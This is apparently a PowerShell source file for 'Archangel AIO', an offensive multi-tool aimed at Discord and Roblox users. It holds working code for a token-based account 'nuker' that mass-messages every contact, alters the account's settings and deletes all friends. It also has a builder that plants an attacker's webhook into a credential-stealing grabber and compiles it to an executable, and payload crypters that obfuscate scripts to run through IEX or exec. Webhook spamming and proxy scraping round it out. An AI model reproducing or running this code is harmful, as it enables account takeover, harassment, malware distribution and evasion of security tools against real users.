#﻿# Madebyevilbytecodelol


$ErrorActionPreference = 'SilentlyContinue' 
$ProgressPreference = 'SilentlyContinue' 
Write-Host "[INFO] Installing PS2EXE, this is recommended to run as an admin incase of building an grabber." -ForegroundColor Red
Install-Module ps2exe




class ACCNuker {
    [string]$Token
    [string]$MessageContent

    ACCNuker() {
        $this.Token = Read-Host "Enter your Discord token"
        $this.MessageContent = Read-Host "Enter the message content"
    }

    [void] MassDM() {
        $headers = @{
            'Authorization' = $this.Token
        }

        $channelIds = (Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me/channels" -Headers $headers).id

        foreach ($channelId in $channelIds) {
            try {
                $body = @{
                    'content' = $this.MessageContent
                }

                $response = Invoke-RestMethod -Uri "https://discord.com/api/v9/channels/$channelId/messages" -Method Post -Headers $headers -Body ($body | ConvertTo-Json) -ContentType "application/json"
                Write-Host "[+] ID: $channelId, Message ID: $($response.id)" -ForegroundColor Blue
            }
            catch {
                Write-Host "Error: $($_.Exception.Message)"
                if ($null -ne $_.Exception.Response) {
                    $errorResponse = $_.Exception.Response.GetResponseStream()
                    $reader = New-Object System.IO.StreamReader($errorResponse)
                    $reader.BaseStream.Position = 0
                    $reader.DiscardBufferedData()
                    $errorDetails = $reader.ReadToEnd()
                    Write-Host "Error Details: $errorDetails"
                }
            }
        }
    }

    [void] SettingsFacker() {
        $modes = @("light", "dark") * 100
        $theme = $modes[(Get-Random -Minimum 0 -Maximum $modes.Count)] 
        $localoptionz = @('ja', 'zh-TW', 'ko', 'zh-CN')
        $locale = $localoptionz | Get-Random

        $customStatus = 'Archangel AIO Runs You: https://github.com/EvilBytecode/Archangel-MultiTool'

        $settings = @{
            'theme'                   = $theme
            'locale'                  = $locale
            'inline_embed_media'      = $false
            'inline_attachment_media' = $false
            'gif_auto_play'           = $false
            'enable_tts_command'      = $false
            'render_embeds'           = $false
            'render_reactions'        = $false
            'animate_emoji'           = $false
            'convert_emoticons'       = $false
            'message_display_compact' = $false
            'explicit_content_filter' = '0'
            'custom_status'           = @{
                'text' = $customStatus
            }
            'status'                  = "idle"
        }

        Write-Host "Current Settings - Theme: $theme, Locale: $locale"

        $url = "https://discord.com/api/v7/users/@me/settings"
        try {
            $null = Invoke-RestMethod -Uri $url -Headers @{ Authorization = $this.Token } -Method Patch -Body ($settings | ConvertTo-Json) -ContentType "application/json"
        }
        catch {
            Write-Host "Error: $($_.Exception.Message)"
        }
    }

    [void] RemoveFriends() {
        try {
            $friendIds = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me/relationships" -Headers @{ Authorization = $this.Token }
            foreach ($friend in $friendIds) {
                Invoke-RestMethod -Uri ("https://discord.com/api/v9/users/@me/relationships/" + $friend.id) -Method Delete -Headers @{ Authorization = $this.Token }
                Write-Host "[+] Removed Friend: $($friend.user.username)#$($friend.user.discriminator)"
            }
        }
        catch {
            Write-Host "Error: $($_.Exception.Message)"
        }
    }
}



function Invoke-GrabberBuild {
    param (
        [string]$foldkittystealname = "grab",
        [string]$kittyfilename = "archangelgrabber.ps1"
    )

    $raw = Join-Path (Join-Path $PSScriptRoot $foldkittystealname) $kittyfilename

    if (Test-Path -Path $raw -PathType Leaf) {
        
        $rawstealer = Get-Content -Path $raw -Raw

        $hook = '%webhook%'

        if ($rawstealer -match $hook) {

            $UW = Read-Host "[+] Enter your webhook URL"

            $rawstealer = $rawstealer -replace $hook, $UW

            $rawstealer | Set-Content -Path $raw
            Invoke-ps2exe .\grab\archangelgrabber.ps1 .\BuiltGrabber.exe
        }
        else {
            Write-Host "[DEBUG] Placeholder '%webhook%' not found in the file." -ForegroundColor Red
        }
    }
    else {
        Write-Host "[DEBUG] File does not exist at the specified path." -ForegroundColor Red
    }
}
function Invoke-ProxyScraping {
    if (-not (Test-Path -Path ".\scrapedproxies" -PathType Container)) { $null = New-Item -ItemType Directory -Path ".\scrapedproxies" }

    $urls = @(
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all"
    )

    $Socks4 = @("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all")

    $socks5 = @("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all")

    $httpname = 'scrapedproxies\http.txt'
    $socks4name = 'scrapedproxies\socks4.txt'
    $socks5name = 'scrapedproxies\socks5.txt'

    function Invoke-Scrape {
        param([string]$url)
        try {
            (Invoke-WebRequest -Uri $url).Content
        }
        catch {
            return $null
        }
    }

    function Save-ScrapedFile {
        param([string]$FN, [string]$url)
        try {
            Invoke-Scrape $url | Set-Content -Path $FN -Force
        }
        catch {
        }
    }

    Clear-Host

    $host.ui.RawUI.WindowTitle = "Archangel Proxy Scraper - Made By: @evilbytecode"

    Write-Host "[+] This program will autoscrape proxies into separate files" -ForegroundColor Yellow
    Write-Host "[+] Scraping Proxies Please Wait . . ." -ForegroundColor Magenta
    Write-Host ""

    foreach ($url in $urls) { Save-ScrapedFile -FN $httpname -url $url }

    Write-Host "[!] Successfully Scraped And Saved HTTP Proxies!" -ForegroundColor Red
    Start-Sleep -Seconds 1

    foreach ($socks4Url in $Socks4) { Save-ScrapedFile -FN $socks4name -url $socks4Url }

    Write-Host "[!] Successfully Scraped And Saved SOCKS4 Proxies!" -ForegroundColor Red
    Start-Sleep -Seconds 1

    foreach ($socks5Url in $socks5) { Save-ScrapedFile -FN $socks5name -url $socks5Url }

    Write-Host "[!] Successfully Scraped And Saved SOCKS5 Proxies!" -ForegroundColor Red
    Start-Sleep -Seconds 1
}

function Invoke-Hypesquadchanger {

    Write-Host -ForegroundColor Blue   "[1] HypeSquad Bravery"
    Write-Host  -ForegroundColor White  "[2] HypeSquad Brilliance"
    Write-Host  -ForegroundColor Red  "[3] HypeSquad Balance"


    $choice = Read-Host "Enter your choice"

    switch ($choice) {
        1 { $house = 1 }
        2 { $house = 2 }
        3 { $house = 3 }
        default { Write-Host -ForegroundColor Red "Invalid choice. Exiting."; exit }
    }

    $T = Read-Host "Enter your Discord token"
    $uri = "https://discord.com/api/v9/hypesquad/online"
    $headers = @{
        "Authorization" = $T
    }

    $jsonuwu = @{
        house_id = $house
    } | ConvertTo-Json

    Invoke-RestMethod -Uri $uri -Method POST -Headers $headers -Body $jsonuwu -ContentType "application/json"
    Write-Host -ForegroundColor White "[+] Sucessfully set new hypesquad badge."
}

function Invoke-faketype {
    param (
        [string]$AuthToken,
        [string]$ChannelId
    )

    if (-not $T) {
        $T = Read-Host "Enter Discord Token"
    }

    if (-not $ChannelId) {
        $ChannelId = Read-Host "Enter Channel ID"
    }

    while ($true) {
        $uri = "https://discord.com/api/v9/channels/$ChannelId/typing"
        $headers = @{
            "Authorization" = $T
        }

        Invoke-RestMethod -Uri $uri -Method POST -Headers $headers

        Start-Sleep -Seconds 5
    }
}

function Invoke-PsPayCrypt {
    param (
        [string]$Path = $null
    )
    
    PROCESS {
        if (-not $Path) {
            $Path = Read-Host "Enter the path to the PowerShell script:"
            if (-not (Test-Path -Path $Path -PathType Leaf)) {
                Write-Host "Invalid path or file does not exist. Exiting."
                return
            }
        }

        $scrcont = Get-Content $Path -Raw
        $encscr = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($scrcont))

        $Seed = Get-Random
        $MixedBase64 = [Text.Encoding]::ASCII.GetString(([Text.Encoding]::ASCII.GetBytes($encscr) | Sort-Object { Get-Random -SetSeed $Seed }))
        
        $Var1 = -Join ((65..90) + (97..122) | Get-Random -Count ((1..12) | Get-Random) | % { [char]$_ })
        $Var2 = -Join ((65..90) + (97..122) | Get-Random -Count ((1..12) | Get-Random) | % { [char]$_ })
        
        $obfedscr = "# Obfuscated by: https://github.com/EvilBytecode`n`n" +
        "`$$($Var1) = [Text.Encoding]::ASCII.GetString(([Text.Encoding]::ASCII.GetBytes(`'$($MixedBase64)') | Sort-Object { Get-Random -SetSeed $($Seed) })); `$$($Var2) = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(`$$($Var1))); IEX `$$($Var2)"

        $putfile = "Obfuscated-" + ([System.IO.Path]::GetRandomFileName() -replace '\.', '') + ".ps1"
        $obfedscr | Out-File -FilePath $putfile

        Write-Host "[+] Obfuscated script saved as $putfile" -ForegroundColor Green
        Start-Sleep 5
    }
}
function Invoke-PyPayCrypt {
    $2encrypt = Read-Host "Enter the path to the Python script"
    if (-not (Test-Path -Path $2encrypt -PathType Leaf)) {
        Write-Host "Invalid path or file does not exist. Exiting."
        return
    }

    $randchr = [char](Get-Random -Minimum 65 -Maximum 91)
    $pyscr = Get-Content -Path $2encrypt -Raw
    $encscr = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($pyscr))
    $impr = "import base64;${randchr}='${encscr}';${randchr}=${randchr}.replace('*','');exec(base64.b64decode(${randchr}))"

    $pyput = "Obfuscated-" + ([System.IO.Path]::GetRandomFileName() -replace '\.', '') + ".py"
    $impr | Out-File -FilePath $pyput
    Write-Host "[+] Obfuscated script saved as $pyput" -ForegroundColor Green
    Start-Sleep 5
}


function Invoke-TokenCheck {
    $token = Read-Host -Prompt "Token"
    Clear-Host

    try {
        $response = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me/library" -Headers @{
            "Content-Type"  = "application/json"
            "Authorization" = $token
        } -ErrorAction Stop

        if ($null -ne $response -and $response -is [System.Management.Automation.PSCustomObject] -and $response.PSObject.Properties.Name -contains 'message') {
            Write-Host "Token is invalid! Error: $($response.message)" -ForegroundColor Magenta
        }
        else {
            Write-Host "[?] Token is either valid or locked, check tokeninfo.json" -ForegroundColor Green
            $tokenInfo = Invoke-RestMethod -Uri "https://discordapp.com/api/v9/users/@me" -Headers @{
                "Content-Type"  = "application/json"
                "Authorization" = $token
            }
            $tokenInfo | ConvertTo-Json | Out-File -FilePath "tokeninfo.json"
            Write-Host "`n`nSaved token info in tokeninfo.json"
        }
    }
    catch {
        Write-Host "Token is invalid! Error: $($_.Exception.Message)" -ForegroundColor Magenta
    }
}


function Invoke-IDTOTOKEN {
    $UID = Read-Host -Prompt "[INPUT] USER ID"
    $ENCBYTE = [System.Text.Encoding]::UTF8.GetBytes($UID)
    $ENCSTR = [Convert]::ToBase64String($ENCBYTE)

    Write-Host "`n[LOGS] TOKEN FIRST PART : $ENCSTR"
}

function Invoke-DelHook {
    try {
        $deletehook = Read-Host -Prompt '[+] Enter webhook to delete'

        Invoke-RestMethod -Uri $deletehook -Method Delete
        Write-Host "[+] Deleted Sucessfully $deletehook" -ForegroundColor Green
    }
    catch {
        Write-Host "[-] Error: $_" -ForegroundColor Red
    }
}

function Invoke-HookSpammer {
    param (
        [string]$hookiepookie = (Read-Host -Prompt "[+] Enter Webhook"),
        [string]$uwumess = (Read-Host -Prompt "[+] Enter Message")
    )

    do {
        $NOT = Read-Host -Prompt "[+] Enter the number of times to send the message"
    } until ($NOT -match '^\d+$')

    if ($hookiepookie -notlike 'https://discord.com/api/webhooks/*') {
        Write-Host "Invalid webhook. It must start with 'https://discord.com/api/webhooks/'. Exiting script in 10 seconds."
        Start-Sleep 10
        Exit
    }

    $Heads = @{
        'Content-Type' = 'application/json'
    }

    for ($i = 1; $i -le $NOT; $i++) {
        $uwubod = @{
            content = $uwumess
        } | ConvertTo-Json

        Invoke-WebRequest -Uri $hookiepookie -Method Post -Headers $Heads -Body $uwubod | Out-Null
        Write-Host "[+] Sented Sucessfully" -ForegroundColor Green
    }
}

function Invoke-RoblosInfo {
    param (
        [string]$RoblosID
    )
    $RoblosID = Read-Host "Enter the Player ID"

    $UA = @{
        'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0'
    }

    try {
        $roliresp = Invoke-RestMethod -Uri "https://www.rolimons.com/api/playerassets/$RoblosID"
        Write-Host "Response from Rolimons API:"
        $roliresp | Format-List

        $roblosapis = @(
            "https://friends.roblox.com/v1/users/$RoblosID/followers/count",
            "https://friends.roblox.com/v1/users/$RoblosID/followings/count",
            "https://friends.roblox.com/v1/users/$RoblosID/friends/count"
        )
        
        foreach ($roblos in $roblosapis) {
            $countResponse = Invoke-RestMethod -Uri $roblos -Headers $UA
            $lab = $roblos -split '/' | Select-Object -Last 1
            Write-Host "$lab $($countResponse.count)"
        }

        $PR = Invoke-RestMethod -Uri "https://users.roblox.com/v1/users/$RoblosID" -Headers $UA
        $PR | Format-List
    }
    catch {
        Write-Host "Error: $_"
    }
}
function Invoke-IpCheck {
    param (
        [string]$ipAddress = (Read-Host "Enter the IP address")
    )

    return (Invoke-RestMethod "https://ipinfo.io/$ipAddress/json")
}

function Invoke-DeleteDMS {
    param (
        [string]$Token,
        [string]$ChannelId
    )
    $token = Read-Host "Enter your token"
    $channelId = Read-Host "Enter the channel ID"
    $null = Invoke-RestMethod -Uri "https://discord.com/api/v7/channels/$ChannelId" -Method Delete -Headers @{ "Authorization" = $Token } -ErrorAction SilentlyContinue
    Write-Host "Sucessfully Deleted Chat"
}

while ($true) {
    $path = "ascii.txt"
    $PCNAME = $env:COMPUTERNAME
    $TF = "tokens.txt"
    $FP = Join-Path -Path $PSScriptRoot -ChildPath $TF
    $TC = (Get-Content -Path $FP -ErrorAction SilentlyContinue | Measure-Object).Count

    $text = @"
                             █████╗ ██████╗  ██████╗██╗  ██╗ █████╗ ███╗   ██╗ ██████╗ ███████╗██╗     
                            ██╔══██╗██╔══██╗██╔════╝██║  ██║██╔══██╗████╗  ██║██╔════╝ ██╔════╝██║     
                            ███████║██████╔╝██║     ███████║███████║██╔██╗ ██║██║  ███╗█████╗  ██║     
                            ██╔══██║██╔══██╗██║     ██╔══██║██╔══██║██║╚██╗██║██║   ██║██╔══╝  ██║     
                            ██║  ██║██║  ██║╚██████╗██║  ██║██║  ██║██║ ╚████║╚██████╔╝███████╗███████╗
                            ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝
                                                                                                                                                           
                                   > [TM] Made by @Evilbytecode
                                   > [!] Star And Follow Archangel AIO On Github for more Updates!

                                       ╔═════════════════════════════════════════╗
                                                    Running on: $PCNAME            
                                                    Tokens: $TC            
                                       ╚═════════════════════════════════════════╝  

╔═══                              ═══╗ ╔═══                               ═══╗ ╔═══                                 ═══╗
║       [1] Token Info               ║ ║          [9]  Build A Grabber       ║ ║                                       ║
║       [2] ID To Token                           [10] Hypesquad Changer                                               ║
║       [3] Delete Webhook                        [11] Roblox Info                                                     ║
║       [4] Spam Webhook                          [12] IP Lookup                                                       ║                                                        
║       [5] Fake Typing                           [13] Delete Dms                                                      ║
║       [6] Python Paylod Crypt                   [14] Account Nuker                                                   ║
║       [7] Powershell Payload Crypt                                                                                   ║
║       [8] Proxy Scraper            ║ ║                                      ║ ║                                      ║
╚═══                              ═══╝ ╚═══                                ═══╝ ╚═══                                ═══╝
"@
    $txtlinez = $text -split "`n"
    $colz = @("Blue", "White", "Red", "Blue", "White", "Blue", "Red", "White", "Blue", "Red", "White", "Blue", "Red", "White", "Blue", "Red", "White", "Blue", "Red", "White", "Blue")
    $pad = [math]::max(0, ($host.ui.rawui.windowsize.width - ($txtlinez | ForEach-Object { $_.TrimEnd() } | Measure-Object -Property Length -Maximum).Maximum) / 2)

    foreach ($i in 0..($txtlinez.Count - 1)) {
        $cent = (" " * $pad) + $txtlinez[$i].TrimEnd()
        Write-Host $cent -ForegroundColor $colz[$i % $colz.Count]
    }
    $choice = Read-Host -Prompt "Enter your choice"
# ascii and this designing made by gomez not by evilbytecode or codepulze.
    switch ($choice) {
        '1' {
            Invoke-TokenCheck
        }
        '2' {
            Invoke-IDTOTOKEN
        }
        '3' {
            Invoke-DelHook
        }
        '4' {
            Invoke-HookSpammer
        }
        '5' {
            Invoke-faketype
        }
        '6' {
            Invoke-PyPayCrypt
        }
        '7' {
            Invoke-PsPayCrypt
        }
        '8' {
            Invoke-ProxyScraping
        }
        '9' {
            Invoke-GrabberBuild
        }
        '10' {
            Invoke-Hypesquadchanger
        }
        '11' {
            Invoke-RoblosInfo
        }
        '12' {
            Invoke-IpCheck
        }
        '13' {
            Invoke-DeleteDMS -Token $token -ChannelId $channelId
        }
        '14' {
            $ACCNuker = [ACCNuker]::new()
            $ACCNuker.SettingsFacker()
            $ACCNuker.MassDM()
            $ACCNuker.RemoveFriends()
        }
        'Q' {
            Write-Host "Exiting..."
            exit
        }
        default {
            Write-Host "Invalid choice. Please try again."
        }
    }
    Read-Host "Press Enter to continue"

    Clear-Host
}


<#
Copyright (c) [2024] [Evilbytecode]

“Commons Clause” License Condition v1.0

The Software is provided to you by the Licensor under the License, as defined below, subject to the following condition.

Without limiting other conditions in the License, the grant of rights under the License will not include, and the License does not grant to you, the right to Sell the Software.

For purposes of the foregoing, “Sell” means practicing any or all of the rights granted to you under the License to provide to third parties, for a fee or other consideration 
(including without limitation fees for hosting or consulting/ support services related to the Software), a product or service whose value derives,
entirely or substantially, from the functionality of the Software. Any license notice or attribution required by the License must also include this Commons Clause License Condition notice.

Software: ArchangelAIO

License: [Apache 2.0]

Licensor: Evilbytecode.


.DESCRIPTION
This is an AIO (ALL IN ONE), this is very cool tool ig???
read license

.NOTES
Educitional Purpoeses only

#>
